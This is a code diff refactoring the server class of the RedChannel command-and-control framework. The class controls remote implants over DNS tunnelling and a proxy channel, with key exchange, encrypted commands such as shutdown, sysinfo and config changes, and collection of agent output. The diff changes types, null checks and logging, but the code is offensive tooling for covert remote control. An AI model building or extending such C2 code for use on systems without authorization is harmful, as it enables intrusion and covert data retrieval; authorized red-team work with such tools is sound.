@@ -14,7 +14,7 @@ import ProxyModule from "../modules/proxy";
 
 import * as implant from "../pb/implant";
 import * as c2 from "../pb/c2";
-import { DefaultConfig, ImplantModuleConfig, RedChannelConfig } from "./config";
+import { DefaultConfig } from "./config";
 
 /*
 req: {
@@ -107,7 +107,7 @@ export default class RedChannel {
     plaintextPassword: string;
 
     configFile: string;
-    config: RedChannelConfig;
+    config: c2.RedChannelConfig;
 
     // the absolute path to the app directory
     appRoot: string = path.resolve("./");
@@ -118,7 +118,7 @@ export default class RedChannel {
 
     modules: RedChannelModules;
 
-    constructor(c2Password: string, configFile: string, initialConfig?: RedChannelConfig) {
+    constructor(c2Password: string, configFile: string, initialConfig?: c2.RedChannelConfig) {
         this.log = new Logger();
 
         this.agents = new Map<AgentId, AgentModel>();
@@ -127,7 +127,7 @@ export default class RedChannel {
 
         this.config = this.resetConfig(initialConfig ?? DefaultConfig);
 
-        if (!this.config.c2.domain) {
+        if (!this.config.c2?.domain) {
             throw new Error("Please specify the c2 domain via cli or config file");
         }
 
@@ -150,13 +150,13 @@ export default class RedChannel {
         this.modules.proxy.proxyInit();
     }
 
-    resetConfig(initialConfig: RedChannelConfig) {
+    resetConfig(initialConfig: c2.RedChannelConfig) {
         let config = initialConfig;
 
         if (this.configFile) {
-            let configInFile: RedChannelConfig;
+            let configInFile: c2.RedChannelConfig;
             try {
-                configInFile = JSON.parse(fs.readFileSync(this.configFile).toString()) as RedChannelConfig;
+                configInFile = JSON.parse(fs.readFileSync(this.configFile).toString()) as c2.RedChannelConfig;
             } catch (ex) {
                 throw new Error(`error parsing config file: ${emsg(ex)}`);
             }
@@ -215,9 +215,9 @@ export default class RedChannel {
                 break;
             case implant.AgentCommand.SET_CONFIG:
                 {
-                    let config: Partial<ImplantModuleConfig>;
+                    let config: Partial<c2.ImplantModuleConfig>;
                     try {
-                        config = JSON.parse(parameters || "{}") as ImplantModuleConfig;
+                        config = JSON.parse(parameters || "{}") as c2.ImplantModuleConfig;
                     } catch (e) {
                         throw new Error(`${implant.AgentCommand[implant.AgentCommand.SET_CONFIG]}: invalid json config object (see implant in redchannel.conf)`);
                     }
@@ -287,8 +287,11 @@ export default class RedChannel {
     }
 
     sendCommandShutdown(agentId: string) {
-        const secret = this.getAgent(agentId)?.secret;
-        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
+        const agent = this.getAgent(agentId);
+        if (!agent) throw new Error(`agent ${agentId} not found`);
+
+        const secret = agent.secret;
+        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to keyx?`);
 
         // agent must be able to decrypt the tag to execute shutdown
         this.queueData(agentId, implant.AgentCommand.SHUTDOWN, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
@@ -297,8 +300,11 @@ export default class RedChannel {
     }
 
     sendCommandSysinfo(agentId: string) {
-        const secret = this.getAgent(agentId)?.secret;
-        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
+        const agent = this.getAgent(agentId);
+        if (!agent) throw new Error(`agent ${agentId} not found`);
+
+        const secret = agent.secret;
+        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to keyx?`);
 
         // agent must be able to decrypt the tag to execute shutdown
         this.queueData(agentId, implant.AgentCommand.SYSINFO, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
@@ -306,13 +312,13 @@ export default class RedChannel {
         });
     }
 
-    sendCommandSetConfig(agentId: string, config: Partial<ImplantModuleConfig>) {
+    sendCommandSetConfig(agentId: string, config: Partial<c2.ImplantModuleConfig>) {
         const configProto = implant.AgentConfig.create({});
-        if (config.interval !== undefined) configProto.c2IntervalMs = { value: Number(config.interval) || this.config.implant.interval };
-        if (config.throttle_sendq !== undefined) configProto.throttleSendq = { value: Boolean(config.throttle_sendq) || this.config.implant.throttle_sendq };
-        if (config.proxy_enabled !== undefined) configProto.useWebChannel = { value: Boolean(config.proxy_enabled) || this.config.implant.proxy_enabled };
-        if (config.proxy_key !== undefined) configProto.webKey = { value: config.proxy_key };
-        if (config.proxy_url !== undefined) configProto.webUrl = { value: config.proxy_url };
+        if (config.interval !== undefined) configProto.c2IntervalMs = { value: Number(config.interval) || this.config.implant?.interval || 5000 };
+        if (config.throttleSendq !== undefined) configProto.throttleSendq = { value: Boolean(config.throttleSendq) };
+        if (config.proxyEnabled !== undefined) configProto.useWebChannel = { value: Boolean(config.proxyEnabled) };
+        if (config.proxyKey !== undefined) configProto.webKey = { value: config.proxyKey };
+        if (config.proxyUrl !== undefined) configProto.webUrl = { value: config.proxyUrl };
 
         const configProtoBuffer = Buffer.from(implant.AgentConfig.toBinary(configProto));
         // no need to send data, just the config proto
@@ -404,7 +410,7 @@ export default class RedChannel {
                 );
             }
 
-            if (this.config.proxy.enabled && agent.channel === c2.AgentChannel.PROXY) {
+            if (this.config.proxy?.enabled && agent.channel === c2.AgentChannel.PROXY) {
                 await this.modules.proxy.sendToProxy(agent.id, ips);
             } else {
                 agent.sendq.push(ips);
@@ -462,6 +468,8 @@ export default class RedChannel {
     }
 
     parseAgentMessageSegments(hostname: string): AgentMessageSegments {
+        if (!this.config.c2?.domain.length) throw new Error(`invalid c2 domain: ${this.config.c2?.domain}`);
+
         const segmentsArray = hostname.slice(0, hostname.length - this.config.c2.domain.length).split(".");
         if (segmentsArray.length < Config.EXPECTED_DATA_SEGMENTS) {
             throw new Error(`invalid message, not enough data segments (${segmentsArray.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
@@ -519,13 +527,15 @@ export default class RedChannel {
     }
 
     c2MessageHandler(req: C2MessageRequest, res: C2MessageResponse) {
+        if (!this.config.c2?.domain.length) throw new Error(`invalid c2 domain: ${this.config.c2?.domain}`);
+
         const question = res.question[0];
         const hostname = question.name;
         const channel = question.type === "PROXY" ? c2.AgentChannel.PROXY : c2.AgentChannel.DNS;
 
-        const staticDnsHostnameIp = this.config.static_dns.get(hostname);
+        const staticDnsHostnameIp = this.config.staticDns[hostname];
         if (staticDnsHostnameIp) {
-            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${staticDnsHostnameIp}'`);
+            this.log.info(`staticDns: responding to request for host: '${hostname}' with ip '${staticDnsHostnameIp}'`);
             res.answer.push({
                 name: hostname,
                 type: C2AnswerType.TYPE_A,
@@ -804,7 +814,7 @@ export default class RedChannel {
                         },
                     ];
                 }
-                this.log.success(`agent(${agentId}) keyx: ${agent.keyx.asPublicECKey().toString("spki")}`);
+                this.log.info(`agent(${agentId}) keyx: ${agent.keyx.asPublicECKey().toString("spki")}`);
 
                 try {
                     agent.secret = this.crypto.deriveSecret(agent.keyx, this.hashedPassword);
@@ -819,7 +829,7 @@ export default class RedChannel {
                         },
                     ];
                 }
-                this.log.success(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);
+                this.log.info(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);
 
                 // if there are no more queued up keyx's, ignore further keyxs from agent
                 if (!this.isCommandInSendQ(agentId, implant.AgentCommand.KEYX)) agent.allowKeyx = false;
@@ -841,7 +851,7 @@ export default class RedChannel {
                         },
                     ];
                 }
-                this.log.success(`agent(${agentId}) output>\n ${agentMessage}`);
+                this.log.info(`agent(${agentId}) output>\n ${agentMessage}`);
                 break;
             }
             case implant.AgentCommand.SYSINFO: {
@@ -875,7 +885,7 @@ export default class RedChannel {
                     ];
                 }
                 this.agents.set(agentId, { ...this.agents.get(agentId)!, sysinfo: sysInfo });
-                this.log.success(`agent(${agentId}) sysinfo>`, sysInfo);
+                this.log.info(`agent(${agentId}) sysinfo>`, sysInfo);
                 break;
             }
         }
@@ -900,7 +910,7 @@ export default class RedChannel {
         if (!agent) throw new Error(`agent ${agentId} not found`);
         if (!data) throw new Error("invalid data");
         if (!agent.keyx) throw new Error("missing keyx");
-        if (!agent.secret || agent.secret.length === 0) throw new Error("missing agent secret, do you need to 'keyx'?");
+        if (!agent.secret || agent.secret.length === 0) throw new Error(`missing agent ${agentId} secret, do you need to keyx?`);
 
         const dataBuffer = Buffer.from(data, "hex");
         const iv = dataBuffer.slice(0, this.crypto.BLOCK_LENGTH);
